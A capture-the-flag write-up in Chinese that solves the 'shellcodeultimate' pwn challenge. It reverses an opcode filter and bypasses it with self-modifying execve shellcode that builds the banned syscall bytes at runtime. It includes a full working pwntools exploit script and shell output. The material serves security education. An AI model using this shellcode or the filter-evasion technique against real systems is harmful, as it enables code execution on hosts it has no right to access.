# Writeup：shellcodeultimate（禁 syscall/NOP + 強制週期性標記 → 自我改寫 shellcode 繞過靜態過濾）

> 目標檔案：[shellcodeultimate](shellcodeultimate)
> 遠端：`nc ctf.adl.tw 10003`（**已實際連線驗證成功，一次就拿到 flag**）
> 分類：Binary Exploitation / pwn
> 用到的程式碼：[disasm.py](disasm.py)（反組譯/過濾邏輯整理，輸出見 [disasm_output.txt](disasm_output.txt)）、[shellcodeultimate_solve.py](shellcodeultimate_solve.py)（最終 exploit）
>
> ```
> Flag: ADLCTF{s31f_m0d1fy1ng_$h311c0d3!!!D1d_Y0u_Enj0y?}
> ```

這題是 [shellcode](../shellcode/shellcode_writeup.md) 那題的「加強版」：一樣是把輸入直接當程式碼執行（stack executable / RWX），但這次**加了一層輸入過濾**，試圖擋掉最直覺的 shellcode 寫法。過濾本身設計得很巧妙（禁止 `syscall`/`int 0x80`/NOP，還要求固定間隔出現特定「魔法標記」），但過濾**只在程式一開始靜態掃過一次輸入**——利用這個時間差，讓 shellcode 在「通過檢查之後」自己動手把被禁止的指令「現場生出來」，就能完全繞過。

---

## 1. 初步偵查

```bash
checksec --file=shellcodeultimate
```
```
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX unknown - GNU_STACK missing
PIE:        No PIE (0x400000)
Stack:      Executable
RWX:        Has RWX segments
```

跟 `shellcode` 題一模一樣的訊號：**stack 可執行**。symbol table 裡沒有 `execve`，也沒有任何 win function——代表這題一樣要自己寫 shellcode。但這次 `main()` 的大小明顯比上一題大很多（0x1a9 bytes vs 上一題的 0x57 bytes），一眼就能猜到：**中間多了過濾邏輯**。

## 2. 反組譯 main()，整理出過濾規則

完整反組譯見 [disasm_output.txt](disasm_output.txt)，整理成 C 虛擬碼：

```c
char buf[0x90];                       // 144 bytes
puts("Try to input something in this buffer again!!!");
read(0, buf, 0x78);                   // 讀 120 bytes，buf 夠大，這次沒有 overflow

// 第一層過濾：逐一檢查全部 120 bytes
for (i = 0; i <= 0x77; i++) {
    if (buf[i] == 0x90)
        { puts("Cheating ! You can't input '0x90' !!"); exit(0); }      // 禁止 NOP

    if (i <= 0x76 && buf[i] == 0x0f && buf[i+1] == 0x05)
        { puts("Syscall is not allowed directly!"); exit(0); }          // 禁止 0f 05 (syscall)

    if (i <= 0x76 && buf[i] == 0xcd && buf[i+1] == 0x80)
        { puts("int 0x80 is not allowed directly!"); exit(0); }         // 禁止 cd 80 (int 0x80)
}

// 第二層過濾：每隔 6 bytes 檢查一組固定標記
for (j = 0; j <= 9; j++) {
    int idx = 6 * j;                     // 0, 6, 12, ..., 54
    if (!(buf[idx] == 0x0c && buf[idx+1] == 0x87))
        { puts("Someting wrong ! Please check your input !"); puts("Try again!!!"); exit(0); }
}

void (*fp)() = (void (*)())buf;
fp();                                   // 兩層過濾都通過，才會執行我們的輸入
```

三個錯誤訊息（`"Cheating ! You can't input '0x90' !!"`、`"Syscall is not allowed directly!"`、`"int 0x80 is not allowed directly!"`）把過濾的意圖講得非常白話：**不准 NOP、不准 `syscall`、不准 `int 0x80`**——這三個合起來，等於把「寫 shellcode 最標準的三個元素」全部擋住了：不能用 NOP sled 當容錯墊片，也不能用任何一種方式**直接**觸發系統呼叫。

## 3. 第二層過濾的真面目：`or al, 0x87`

一開始看到「每隔 6 bytes 必須是 `0x0c, 0x87`」，很容易誤以為是某種驗證碼或版權浮水印。查一下 x86 opcode table：

```
0x0c <imm8>  =  OR AL, imm8
```

所以 `0c 87` 剛好就是一條**完整、合法、完全無害的指令**：`or al, 0x87`——單純對 `AL` 暫存器做一次 OR 運算，不會讓程式跳走、不會造成任何副作用（除了改掉 `AL` 的值，以及影響幾個旗標暫存器）。

**這代表 `main()` 的檢查雖然看起來很嚴格，但其實只是「強迫你的 shellcode 每 6 bytes 就要忍受一條外來的 `or al,0x87` 插進來」，不是真的限制你能做什麼**——只要你確保自己的程式邏輯不會因為 `AL` 被意外改掉而出錯（或者乾脆避開依賴 `AL` 值跨越這些強制插入點），你還是可以正常寫出完整的 shellcode，只是要在這前 60 bytes 裡，每 6 bytes 只有 4 bytes 是你真正能自由運用的空間（`2/6` 被強制佔用）。

更進一步：這段「每 6 bytes 檢查」只跑到 `j=9`（index 54~55），只影響**前 60 bytes**（index 0~59）。再往後（index 60~119，整整 60 bytes）完全沒有這個限制，可以完全自由發揮——這段空間拿來放真正的 shellcode邏輯綽綽有餘。

## 4. 真正的突破口：過濾只跑一次，而且只檢查「送出去的 bytes」

把三條規則放在一起看：

- NOP、`syscall`、`int 0x80` 這三樣東西，都是對 **我們送出去、程式一開始 `read()` 進來的那 120 bytes** 做的**一次性、靜態的**掃描。
- 這個檢查發生在 **shellcode 真正開始執行之前**（`fp()` 呼叫之前）。
- 過濾邏輯完全沒有在程式「執行到一半」的時候，再回頭檢查記憶體內容有沒有變化。

這代表：只要我們的 shellcode **在執行過程中，自己動手把 `syscall` 這兩個被禁止的 bytes（`0f 05`）寫到記憶體裡**（而不是把它們直接包含在一開始送出去、被掃描過的 120 bytes 裡面），filter 就完全看不到——因為它只檢查了「你送來的原始資料」，從來沒檢查過「你的程式執行之後，記憶體變成了什麼樣子」。

### 具體做法

1. 用 `lea rbx, [rip + N]` 算出一個我們自己 shellcode 之後、還沒被用到的記憶體位址（**用 RIP 相對定址，不需要知道 stack 的絕對位址**，No PIE 加上 RIP-relative，讓我們的 shellcode 完全不需要 leak 任何位址就能自己定位自己）。
2. 用 `mov word ptr [rbx], 0x050e` 把 `0x0e, 0x05` 這兩個「看起來無害」的 bytes 寫進那個位址——**注意這裡故意不直接寫 `0x050f`**：因為 `mov` 指令的立即數本身也是我們「送出去的 bytes」的一部分，如果直接寫 `0x050f`，這條指令自己的機器碼裡就會出現 `0f 05`，照樣會被過濾抓到！所以先寫一個只差 1 的安全值 `0x050e`（bytes 排列是 `0e 05`，不會觸發任何規則）。
3. 用 `inc byte ptr [rbx]` 把剛剛寫進去的低位元組**在執行期間**從 `0x0e` 加 1 變成 `0x0f`——這一步完全沒有在我們送出去的 bytes 裡留下 `0f 05` 這個組合，但執行完之後，目標記憶體裡確確實實變成了 `0f 05`。
4. `jmp rbx` 跳過去，執行這段「剛剛才被自己生出來」的 `syscall` 指令。

這就是**自我改寫 shellcode（self-modifying shellcode）**：filter 稽查的是「你交卷時寫了什麼」，不是「考試進行中你在紙上動了什麼手腳」——只要最終答案交卷那一刻是乾淨的，之後你想在腦子裡（記憶體裡）怎麼改都不關它的事。

## 5. 組完整 Payload

### 前 60 bytes：滿足週期性標記

```python
FILLER = 0xF8   # clc，1 byte、沒有副作用、不是被禁止的 0x90

prefix = b''
for _ in range(10):
    prefix += bytes([0x0c, 0x87]) + bytes([FILLER]) * 4   # "or al,0x87" + 4 bytes 安全填充
# 共 60 bytes，滿足 10 組 (idx=0,6,...,54) 的標記要求
```

（用 `0xF8`＝`clc` 當填充，是因為它是 1-byte、無運算元、不會意外吃掉後面的 bytes，而且不是 `0x90`。）

### 第 60 byte 之後：真正的 execve("/bin/sh") shellcode

```asm
xor rsi, rsi
push rsi
movabs rdi, 0x68732f6e69622f2f     ; "/bin//sh"
push rdi
mov rdi, rsp
xor rdx, rdx
mov al, 0x3b                        ; execve 的 syscall number
lea rbx, [rip + 10]                 ; rbx = 自己這段 shellcode 結尾後面一點的位址
mov word ptr [rbx], 0x050e          ; 先寫一個安全值 (bytes: 0e 05)
inc byte ptr [rbx]                  ; 執行期間才讓它變成 0f 05
jmp rbx                              ; 跳過去執行剛生出來的 syscall
```

共 39 bytes，剩下的空間用 `0xF8` 填到滿 120 bytes。

### 送出前，先在本地模擬一次過濾邏輯再送

`solve script` 裡的 `passes_filter()` 函式，直接照抄 `main()` 的檢查邏輯，在 Python 裡先跑一次，確認組出來的 120 bytes 真的不會被擋，再送出去——這個習慣在這種「要繞過特定過濾規則」的題型裡很值得養成，可以在送出前就抓到自己手滑寫錯的地方。

## 6. 完整 Exploit Script

完整版本見 [shellcodeultimate_solve.py](shellcodeultimate_solve.py)：

```python
from pwn import *
from keystone import Ks, KS_ARCH_X86, KS_MODE_64

FILLER = 0xF8

def build_real_shellcode():
    ks = Ks(KS_ARCH_X86, KS_MODE_64)
    asm = '''
    xor rsi, rsi
    push rsi
    movabs rdi, 0x68732f6e69622f2f
    push rdi
    mov rdi, rsp
    xor rdx, rdx
    mov al, 0x3b
    lea rbx, [rip + 10]
    mov word ptr [rbx], 0x050e
    inc byte ptr [rbx]
    jmp rbx
    '''
    enc, _ = ks.asm(asm)
    return bytes(enc)

payload = b''
for _ in range(10):
    payload += bytes([0x0c, 0x87]) + bytes([FILLER] * 4)
payload += build_real_shellcode()
payload += bytes([FILLER]) * (0x78 - len(payload))

p = remote('ctf.adl.tw', 10003, timeout=10)
p.recvuntil(b'!!!')
p.send(payload)
p.interactive()
```

### 實際連線結果

```
Try to input something in this buffer again!!!
```
送出 payload 後：
```
There are obstacles that need to be overcome ~
uid=1000(shellcodeultimate) gid=1000(shellcodeultimate) groups=1000(shellcodeultimate)
```

（`"There are obstacles..."` 其實是程式自己在 `read()` 之前就印出的第二句台詞，只是我們第一次 `recv()` 剛好沒把它一起收完，才會在 transcript 裡看起來像是「後來才冒出來」——這只是收資料時機的小細節，不影響結果。真正能確認 shellcode 有被執行、`/bin/sh` 真的拿到的證據，是緊接著出現的 `uid=1000(shellcodeultimate)...`，這就是我們送出的 `id` 指令的真實執行結果。）

```
find / -iname "*flag*" 2>/dev/null
# -> /home/shellcodeultimate/flag
cat /home/shellcodeultimate/flag
# -> ADLCTF{s31f_m0d1fy1ng_$h311c0d3!!!D1d_Y0u_Enj0y?}
```

flag 本身就直接點名了解法——`self_modifying_shellcode`。

---

## 重點整理

- **這題教的核心觀念：靜態檢查 vs 動態行為的時間差**。任何只在「輸入進來的那一刻」做一次性掃描的過濾（不管掃描規則設計得多巧妙），天生就無法防禦「程式執行之後才產生」的內容。只要能讓被禁止的 bytes **在過濾檢查之後才出現在記憶體裡**，過濾就形同虛設。這跟前面 `son` 題的「用 `_exit()` 跳過 canary 檢查」是同一種思路的不同應用：**找出檢查發生的確切時間點，想辦法讓你真正想做的事情發生在那個時間點之後**。
- **自我改寫 shellcode（self-modifying code）是這類「禁止特定 opcode」防禦的標準反制手段**：用安全的指令（`mov`/`inc`/`xor` 這些運算指令）在記憶體裡動態「組裝」出被禁止的指令 bytes，再跳過去執行；而不是把被禁止的 bytes 直接寫在你送出去的資料裡。
- **看起來像驗證規則的東西，先查清楚它實際要求的是什麼，而不是急著找破解方法**：這題的「每 6 bytes 一組標記」一開始很唬人，但一查 opcode table 就知道那只是一條完全無害的 `or al, 0x87`——搞清楚它的真實語意之後，繞過方式自然就浮現了（只要在中間的 4 bytes 塞東西，不用跟它正面衝突）。
- **RIP 相對定址讓 shellcode 不需要知道自己的絕對位址**：`lea rbx, [rip+N]` 在 No PIE 的情況下一樣好用，而且完全不需要額外 leak 任何東西，這對「自己生出一段新指令並跳過去執行」這種需要精準定位自己位置的技巧特別重要。
- **送出 payload 前，先在本地重現一次目標的檢查邏輯**：把 `main()` 的過濾規則原封不動翻成 Python 函式，在送出前跑一次自我檢查，能在連線測試前就抓到大部分低級錯誤（例如忘記某個 index 算錯、某段立即數不小心包含了被禁止的 byte pattern）。
- **解題思路順序**：`checksec` 發現一樣是 `Stack: Executable`，鎖定方向是自寫 shellcode → 發現 `main()` 比上一題大很多，反組譯整理出三條過濾規則（禁 NOP、禁 `syscall`、禁 `int 0x80`）+ 一條週期性標記規則 → 查 opcode 確認標記只是無害的 `or al,0x87`，算出真正可自由使用的位元組範圍 → 想清楚「過濾只跑一次、只看送出去的原始資料」這個關鍵時間差 → 設計自我改寫 shellcode：安全值寫入 + `inc` 現場湊出 `syscall` 指令 + `jmp` 過去執行 → 本地模擬過濾邏輯自我檢查 → 連線送出、拿到 shell、找到並讀出 flag。
